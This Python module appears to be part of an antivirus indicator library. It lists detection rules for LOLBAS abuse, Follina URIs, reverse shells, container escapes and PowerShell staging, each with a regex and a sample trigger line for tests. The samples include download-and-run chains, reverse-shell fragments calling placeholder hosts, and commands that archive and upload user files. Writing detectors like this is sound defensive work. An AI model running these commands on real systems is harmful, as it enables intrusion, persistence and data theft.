"""Technique library, part two (v3.1) - additional indicator checks.

Rows are appended to :data:`ROWS` in the compact form::

    (id, name, category, severity, description, patterns, tags, sample)

*patterns* is a tuple of single-line regexes (any one fires the check).
*sample* is the text scanned as ``sample.txt``, or ``(file_name, text)`` when
the check is file-name bound.  Samples are load-bearing: they are what
``tests/test_techniques.py`` feeds the scanner to prove each check fires, and
what ``antivirus indicators --show ID`` prints as documentation.
"""
from __future__ import annotations

from typing import List

ROWS: List[tuple] = []

ROWS.extend([
    ("IND2-EXEC-LOLBAS-MAVINJECT", "mavinject process injection", "execution", "high",
     "mavinject is a signed Microsoft binary that loads a DLL into a running process.",
     (r"mavinject(?:\.exe)?[^\n]{0,40}/INJECTRUNNING",), ("lolbin", "injection"),
     'mavinject.exe 4321 /INJECTRUNNING C:\\Users\\Public\\payload.dll'),
    ("IND2-EXEC-LOLBAS-MSHTA-PROTO", "mshta inline protocol handler", "execution", "high",
     "mshta running an inline protocol handler instead of a file (LOLBAS).",
     (r"mshta(?:\.exe)?\s+(?:about|javascript|vbscript|res):",), ("lolbin", "uri"),
     'mshta vbscript:Execute(CreateObject(WScript.Shell).Run calc:close)'),
    ("IND2-EXEC-LOLBAS-EXPLORER-STARTUP", "explorer shell: startup folder", "execution", "high",
     "explorer.exe opening a shell: folder such as the startup directory.",
     (r"explorer(?:\.exe)?\s+shell:(?:startup|common startup|start menu)",), ("lolbin", "persistence"),
     'explorer.exe shell:startup'),
    ("IND2-EXEC-LOLBAS-EXPLORER-REMOTE", "explorer opening a remote path", "execution", "high",
     "explorer.exe pointed at a UNC path to run something from a remote host.",
     (r"explorer(?:\.exe)?\s+\\\\[A-Za-z0-9._-]+\\",), ("lolbin", "smb"),
     'explorer.exe \\\\10.0.0.5\\share\\payload.exe'),
    ("IND2-EXEC-LOLBAS-PCALUA", "pcalua compatibility-shim execution", "execution", "medium",
     "pcalua.exe -a <binary> runs a program through the compatibility assistant.",
     (r"pcalua(?:\.exe)?[^\n]{0,30}-a\s",), ("lolbin", "proxy"),
     'pcalua.exe -a C:\\Windows\\System32\\calc.exe'),
    ("IND2-EXEC-LOLBAS-CDB", "cdb debugger as a launcher", "execution", "medium",
     "cdb.exe -cf <script> makes the Windows debugger execute a target.",
     (r"cdb(?:\.exe)?[^\n]{0,40}-cf\s",), ("lolbin", "debugger"),
     'cdb.exe -cf script.txt calc.exe'),
    ("IND2-EXEC-LOLBAS-WSRESET", "wsreset silent installer abuse", "execution", "medium",
     "wsreset.exe -i installs an AppX package from a URL through a signed binary.",
     (r"wsreset(?:\.exe)?\s+-i\s",), ("lolbin", "appx"),
     'wsreset.exe -i http://203.0.113.9/payload.appx'),
    ("IND2-EXEC-LOLBAS-XWIZARD", "xwizard COM object execution", "execution", "medium",
     "xwizard.exe instantiated with a raw CLSID (documented COM proxy execution).",
     (r"xwizard(?:\.exe)?\s+\{[0-9a-fA-F-]{36}\}",), ("lolbin", "com"),
     'xwizard.exe {7e8a0b4f-2d3a-4a3a-9c1f-0d2b4f6a8c11}'),
    ("IND2-EXEC-LOLBAS-TRACERS", "signed tracer execution", "execution", "medium",
     "Signed tracing binaries used as generic launchers (LOLBAS catalogue).",
     (r"(?:IMEWDBLD|tttracer|OpenConsole|mftrace)\.exe",), ("lolbin", "proxy"),
     'tttracer.exe -dumpfull C:\\tools\\dump.dll'),
    ("IND2-EXEC-LOLBAS-VSJIT", "vsjitdebugger attaches to a process", "execution", "medium",
     "vsjitdebugger.exe -p <pid> attaches the just-in-time debugger (injection proxy).",
     (r"vsjitdebugger(?:\.exe)?\s+-p\s",), ("lolbin", "injection"),
     'vsjitdebugger.exe -p 4321'),
    ("IND2-EXEC-LOLBAS-WERMGR", "Windows Error Reporting upload", "execution", "medium",
     "wermgr.exe -upload sends a file to Microsoft: quiet exfiltration or loading.",
     (r"wermgr(?:\.exe)?[^\n]{0,30}-upload\s",), ("lolbin", "exfil"),
     'wermgr.exe -upload C:\\Users\\Public\\loot.zip'),
    ("IND2-EXEC-LOLBAS-SQLPS", "sqlps shell host", "execution", "medium",
     "sqlps.exe runs PowerShell inside SQL Server tooling, where PS is often blocked.",
     (r"sqlps(?:\.exe)?[^\n]{0,20}-Command\b",), ("lolbin", "powershell"),
     'sqlps.exe -Command iex (iwr http://203.0.113.9/x.ps1)'),
    ("IND2-EXEC-LOLBAS-WSL-BASH", "WSL used as a script host", "execution", "medium",
     "wsl.exe running bash -c executes a command through the Linux subsystem.",
     (r"wsl(?:\.exe)?\s+(?:-e\s+)?bash\s+-c\b",), ("lolbin", "linux"),
     'wsl.exe -e bash -c curl -s http://10.9.9.9/x.sh | sh'),
    ("IND2-EXEC-LOLBAS-DLLHOST", "dllhost COM surrogate with a CLSID", "execution", "medium",
     "dllhost.exe /Processid:{...} loads an arbitrary COM surrogate.",
     (r"dllhost(?:\.exe)?\s+/Processid:\{[0-9a-fA-F-]{36}\}",), ("lolbin", "com"),
     'dllhost.exe /Processid:{3ad05575-8857-4850-9277-11b85bdb8e09}'),
    ("IND2-EXEC-LOLBAS-MMC", "mmc loading a supplied console file", "execution", "medium",
     "mmc.exe opening a .msc from a user-writable path executes a supplied snap-in.",
     (r"mmc(?:\.exe)?[^\n]{0,60}\.msc\b",), ("lolbin", "proxy"),
     'mmc.exe C:\\Users\\Public\\evil.msc -a test'),
    ("IND2-EXEC-URI-MS-MSDT", "MSDT diagnostics URI", "execution", "critical",
     "ms-msdt: URI or msdt.exe IT_BrowseForFile - the Follina diagnostics abuse.",
     (r"ms-msdt:", r"msdt(?:\.exe)?[^\n]{0,60}IT_BrowseForFile"), ("office", "cve"),
     'ms-msdt:/id PCWDiagnostic /skip force /param IT_BrowseForFile=$(calc)'),
    ("IND2-EXEC-URI-SEARCH-MS", "search-ms protocol handler", "execution", "high",
     "search-ms: opens a remote search connector to lure a victim onto a share.",
     (r"(?:search-ms|ms-search):",), ("uri", "phishing"),
     'search-ms:query=payroll&crumb=location:\\\\203.0.113.9\\share'),
    ("IND2-EXEC-URI-OFFICE-SCHEME", "Office application protocol handler", "execution", "medium",
     "ms-excel:/ms-word:/ms-officecmd: URIs pull a remote document into Office.",
     (r"(?:ms-officecmd|ms-word|ms-excel):",), ("uri", "office"),
     'ms-excel:ofv|u|http://203.0.113.9/invoice.xlsx'),
    ("IND2-EXEC-RUNDLL32-URL", "rundll32 URL protocol handler", "execution", "high",
     "rundll32 url.dll,FileProtocolHandler launches a remote file.",
     (r"rundll32(?:\.exe)?[^\n]{0,60}url\.dll,\s*FileProtocolHandler",), ("lolbin", "download"),
     'rundll32.exe url.dll,FileProtocolHandler http://203.0.113.9/x.exe'),
    ("IND2-EXEC-RUNDLL32-CPL", "rundll32 runs a control panel applet", "execution", "high",
     "rundll32 shell32.dll,Control_RunDLL with a .cpl from a user path.",
     (r"rundll32(?:\.exe)?[^\n]{0,60}shell32\.dll,\s*Control_RunDLL",), ("lolbin", "cpl"),
     'rundll32.exe shell32.dll,Control_RunDLL C:\\Users\\Public\\payload.cpl'),
    ("IND2-EXEC-RUNDLL32-IMAGE", "rundll32 image handler", "execution", "medium",
     "rundll32 shimgvw.dll - an old trick to run a payload delivered as an image.",
     (r"rundll32(?:\.exe)?[^\n]{0,60}shimgvw\.dll",), ("lolbin", "image"),
     'rundll32.exe shimgvw.dll,ImageView_Fullscreen C:\\Users\\Public\\x.jpg'),
    ("IND2-EXEC-REGSVCS", ".NET service installer proxy", "execution", "medium",
     "regsvcs.exe installs a .NET assembly supplied by the attacker.",
     (r"regsvcs(?:\.exe)?[^\n]{0,40}\.dll",), ("lolbin", "dotnet"),
     'regsvcs.exe C:\\Users\\Public\\payload.dll'),
    ("IND2-EXEC-CSC-COMPILE", "csc compiles an executable on the host", "execution", "high",
     "The C# compiler building an exe: code compiled on the victim host.",
     (r"csc(?:\.exe)?[^\n]{0,80}/target:(?:exe|winexe)",), ("compiler", "dotnet"),
     'csc.exe /noconfig /target:exe /out:C:\\Users\\Public\\implant.exe implant.cs'),
    ("IND2-EXEC-ASPNET-COMPILER", "aspnet_compiler proxy execution", "execution", "medium",
     "aspnet_compiler.exe compiling a supplied directory of sources.",
     (r"aspnet_compiler(?:\.exe)?[^\n]{0,40}-p\s",), ("lolbin", "dotnet"),
     'aspnet_compiler.exe -v none -p C:\\Users\\Public\\webshell'),
    ("IND2-EXEC-CL-LOADDLL", "cl_loaddll debugger injection", "execution", "medium",
     "cl_loaddll.exe <pid> <dll> injects a DLL through a signed debugger helper.",
     (r"cl_loaddll(?:\.exe)?\s+\d+",), ("lolbin", "injection"),
     'cl_loaddll.exe 4321 C:\\Users\\Public\\imp.dll'),
    ("IND2-EXEC-MAKECAB", "makecab staging a payload", "execution", "low",
     "makecab compressing a payload into a cabinet as a staging step.",
     (r"makecab(?:\.exe)?[^\n]{0,80}\.cab\b",), ("lolbin", "staging"),
     'makecab.exe /D CompressionType=LZX payload.exe payload.cab'),
    ("IND2-EXEC-RASPHONE", "rasphone executing a phonebook", "execution", "low",
     "rasphone.exe -f <file> loads a supplied .pbk which can carry a command.",
     (r"rasphone(?:\.exe)?[^\n]{0,40}-f\s",), ("lolbin", "dialup"),
     'rasphone.exe -f C:\\Users\\Public\\vpn.pbk'),
    ("IND2-EXEC-SQLCMD-XPCMDSHELL", "sqlcmd running xp_cmdshell", "execution", "high",
     "sqlcmd -Q with xp_cmdshell executes an OS command through SQL Server.",
     (r"sqlcmd(?:\.exe)?[^\n]{0,80}xp_cmdshell",), ("mssql", "lateral"),
     'sqlcmd -S 10.0.0.9 -Q xp_cmdshell whoami'),
    ("IND2-EXEC-PSQL-COPY-PROGRAM", "psql COPY TO PROGRAM", "execution", "high",
     "PostgreSQL COPY TO PROGRAM executes a shell command server-side.",
     (r"COPY[^\n]{0,60}TO\s+PROGRAM",), ("postgres", "lateral"),
     'psql -h 10.0.0.9 -c COPY (SELECT 1) TO PROGRAM id'),
    ("IND2-EXEC-LINUX-DL-CHMOD", "download, chmod and run chain", "execution", "high",
     "A Linux download followed by chmod +x in one command line.",
     (r"(?:curl|wget)[^\n]{0,100}chmod\s+(?:\+x|755)",), ("linux", "download"),
     'curl -s http://203.0.113.9/x.sh -o /tmp/x && chmod +x /tmp/x && /tmp/x'),
    ("IND2-EXEC-NOHUP-TMP", "background process from /tmp", "execution", "medium",
     "nohup launching a binary from /tmp and detaching it.",
     (r"nohup[^\n]{0,60}/tmp/[^\n]{0,60}",), ("linux", "implant"),
     'nohup /tmp/.x/agent >/dev/null 2>&1 &'),
    ("IND2-EXEC-DEVSHM", "execution from /dev/shm", "execution", "high",
     "A binary in the tmpfs /dev/shm made executable and run from there.",
     (r"chmod\s+\+x\s+/dev/shm/",), ("linux", "tmpfs"),
     'chmod +x /dev/shm/payload && /dev/shm/payload'),
    ("IND2-EXEC-COMPILE-ON-HOST", "binary compiled on the host", "execution", "medium",
     "gcc/clang building an executable into /tmp on the victim host.",
     (r"(?:gcc|cc|clang)\s+[^\n]{0,80}-o\s+/tmp/",), ("linux", "compiler"),
     'gcc -o /tmp/x x.c && /tmp/x'),
    ("IND2-EXEC-PERL-SOCKET", "Perl reverse shell", "execution", "high",
     "perl -e with IO::Socket: the classic Perl one-line backdoor.",
     (r"perl\s+-e[^\n]{0,100}IO::Socket",), ("perl", "backdoor"),
     'perl -e use IO::Socket; $s=IO::Socket::INET->new(10.0.0.9:4444);'),
    ("IND2-EXEC-PY-SOCKET-SHELL", "Python reverse shell", "execution", "high",
     "python -c opening a socket and spawning a process: an inline shell.",
     (r"python[0-9.]*\s+-c[^\n]{0,120}socket\.socket",), ("python", "backdoor"),
     'python3 -c import socket,subprocess,os;s=socket.socket();s.connect((10.0.0.9,4444))'),
    ("IND2-EXEC-PY-PTY-SPAWN", "Python pty shell", "execution", "high",
     "python -c using pty.spawn to hand over an interactive shell.",
     (r"pty\.spawn\(",), ("python", "backdoor"),
     'python3 -c import pty;pty.spawn(/bin/bash)'),
    ("IND2-EXEC-NODE-CHILDPROCESS", "Node.js child process execution", "execution", "medium",
     "node -e pulling in child_process for inline command execution.",
     (r"node\s+-e[^\n]{0,100}child_process",), ("nodejs", "inline"),
     'node -e require(child_process).exec(id)'),
    ("IND2-EXEC-RUBY-SOCKET", "Ruby reverse shell", "execution", "high",
     "ruby -e with TCPSocket or IO.popen: an inline Ruby backdoor.",
     (r"ruby\s+-e[^\n]{0,100}(?:TCPSocket|IO\.popen)",), ("ruby", "backdoor"),
     'ruby -e TCPSocket.open(10.0.0.9,4444).puts(x)'),
    ("IND2-EXEC-PHP-INLINE-SYSTEM", "php -r command execution", "execution", "medium",
     "php -r calling system() on the command line.",
     (r"php\s+-r[^\n]{0,80}(?:system|shell_exec|passthru)\s*\(",), ("php", "inline"),
     'php -r system(id);'),
    ("IND2-EXEC-LUA-OS-EXECUTE", "Lua os.execute", "execution", "medium",
     "lua -e calling os.execute: a Lua payload running commands.",
     (r"lua[0-9.]*\s+-e[^\n]{0,80}os\.execute",), ("lua", "inline"),
     'lua -e os.execute(id)'),
    ("IND2-EXEC-PS-CRED-OBJECT", "PowerShell PSCredential object", "execution", "medium",
     "New-Object PSCredential assembles credentials in memory.",
     (r"New-Object\s+(?:System\.)?Management\.Automation\.PSCredential",), ("powershell", "credential"),
     '$c = New-Object System.Management.Automation.PSCredential(admin, $pwd)'),
    ("IND2-EXEC-PS-SECURESTRING", "SecureString from plaintext", "execution", "medium",
     "ConvertTo-SecureString -AsPlainText embeds a password in the script.",
     (r"ConvertTo-SecureString[^\n]{0,80}-AsPlainText",), ("powershell", "credential"),
     "$p = ConvertTo-SecureString -AsPlainText -Force"),
    ("IND2-EXEC-PS-RUNSPACE", "PowerShell runspace built in code", "execution", "medium",
     "RunspaceFactory CreateRunspace builds a private runspace for in-memory execution.",
     (r"CreateRunspace|RunspaceFactory",), ("powershell", "in-memory"),
     '$rs = [runspacefactory]::CreateRunspace(); $rs.Open()'),
    ("IND2-EXEC-PS-SCRIPTBLOCK", "PowerShell ScriptBlock.Create", "execution", "high",
     "[ScriptBlock]::Create turns a decoded string into executable PowerShell.",
     (r"\[ScriptBlock\]::Create\(",), ("powershell", "obfuscation"),
     '$sb=[ScriptBlock]::Create([Text.Encoding]::UTF8.GetString($b))'),
    ("IND2-EXEC-PS-COMPRESS-ARCHIVE", "PowerShell staging archive", "execution", "medium",
     "Compress-Archive collecting files before exfiltration.",
     (r"Compress-Archive[^\n]{0,80}-DestinationPath",), ("powershell", "staging"),
     'Compress-Archive -Path C:\\Users\\*\\Documents -DestinationPath C:\\Windows\\Temp\\loot.zip'),
    ("IND2-EXEC-PS-TRANSCRIPT", "PowerShell transcript started", "execution", "low",
     "Start-Transcript writes every command and its output to a file.",
     (r"Start-Transcript[^\n]{0,60}-OutputFile",), ("powershell", "logging"),
     'Start-Transcript -OutputFile C:\\Users\\Public\\session.log'),
    ("IND2-EXEC-PS-PSSESSION-CRED", "PowerShell remote with credentials", "execution", "high",
     "Enter/New-PSSession carrying an explicit credential object.",
     (r"(?:Enter|New)-PSSession[^\n]{0,80}-Credential",), ("powershell", "lateral"),
     '$s = New-PSSession -ComputerName 10.0.0.9 -Credential $cred'),
    ("IND2-EXEC-BITS-TRANSFER", "Start-BitsTransfer download", "execution", "medium",
     "Start-BitsTransfer pulls a file over BITS, which many egress rules allow.",
     (r"Start-BitsTransfer[^\n]{0,80}-Source\s+https?://",), ("powershell", "download"),
     'Start-BitsTransfer -Source http://203.0.113.9/x.exe -Destination C:\\Users\\Public\\x.exe'),
    ("IND2-EXEC-WMIC-PROCESS-CREATE", "wmic process call create", "execution", "high",
     "wmic process call create runs a command line locally or remotely.",
     (r"process\s+call\s+create",), ("wmi", "lateral"),
     'wmic process call create "cmd.exe /c whoami"'),
    ("IND2-EXEC-WMI-VBS-CREATE", "WMI process creation from script", "execution", "medium",
     "Win32_Process .Create called from a scripting host.",
     (r"Win32_Process[^\n]{0,40}\.Create\(",), ("wmi", "script"),
     'obj.Get(Win32_Process).Create(cmd /c whoami)'),
    ("IND2-EXEC-CIM-PROCESS-CREATE", "CIM remote execution", "execution", "high",
     "Invoke-CimMethod Win32_Process Create runs code on a remote host.",
     (r"Invoke-CimMethod[^\n]{0,120}Win32_Process",), ("wmi", "lateral"),
     'Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine=calc}'),
    ("IND2-EXEC-NSENTER", "nsenter into the host namespace", "execution", "high",
     "nsenter -t 1 entering the host PID namespace: the container break-out step.",
     (r"nsenter[^\n]{0,60}-t\s*1",), ("container", "escape"),
     'nsenter -t 1 -m -u -i -n -p -- /bin/sh'),
    ("IND2-EXEC-UNSHARE", "unshare namespace creation", "execution", "medium",
     "unshare creating new namespaces, often to mount or escape a container.",
     (r"unshare\s+(?:--mount|--pid|--uts|--net|-m|-p)\b",), ("container", "escape"),
     'unshare --mount --pid --fork /bin/bash'),
    ("IND2-EXEC-DOCKER-SOCK-MOUNT", "docker socket mounted into a container", "execution", "high",
     "Mounting /var/run/docker.sock gives the container root on the host.",
     (r"docker\s+run[^\n]{0,90}/var/run/docker\.sock",), ("container", "escape"),
     'docker run -v /var/run/docker.sock:/var/run/docker.sock -it alpine'),
    ("IND2-EXEC-SCHTASKS-PS-ACTION", "scheduled task running PowerShell", "execution", "high",
     "schtasks /create with a PowerShell or mshta action.",
     (r"schtasks(?:\.exe)?[^\n]{0,140}/tr[^\n]{0,60}(?:powershell|mshta|wscript|cscript)",),
     ("persistence", "scheduled-task"),
     'schtasks /create /tn Upd /tr "powershell -w hidden -enc SQBFAFgA" /sc onlogon'),
])


def _sample_of(row: tuple):
    """``(file_name, text)`` for one row (samples may be a bare string)."""
    sample = row[7]
    if isinstance(sample, tuple):
        return sample[0], sample[1]
    return "sample.txt", sample


#: ``{check id: (file name, trigger text)}`` – used by the tests, by
#: ``antivirus indicators --show`` and by ``--dump-samples``.
SAMPLES: dict = {row[0]: _sample_of(row) for row in ROWS}


def rows_as_indicators(_i):
    """Expand every row through ``indicators._i`` (keeps one row format)."""
    out = []
    for row in ROWS:
        cid, name, category, severity, description, patterns, tags = row[:7]
        out.append(_i(cid, name, category, severity, description, *patterns,
                      tags=tags))
    return tuple(out)


def sample_for(check_id: str):
    """Trigger sample for one check, or ``None``."""
    return SAMPLES.get(check_id)


def dump_samples(directory) -> list:
    """Write every trigger sample into *directory*; returns the paths.

    The samples are inert text (they describe technique markers, they do not
    execute anything), so they are safe to keep as a regression fixture.
    """
    from pathlib import Path

    root = Path(directory)
    root.mkdir(parents=True, exist_ok=True)
    written = []
    for row in ROWS:
        check_id, file_name, text = row[0], _sample_of(row)[0], _sample_of(row)[1]
        target = root / f"{check_id}_{Path(file_name).name}"
        target.write_text(text + "\n", encoding="utf-8")
        written.append(target)
    return written
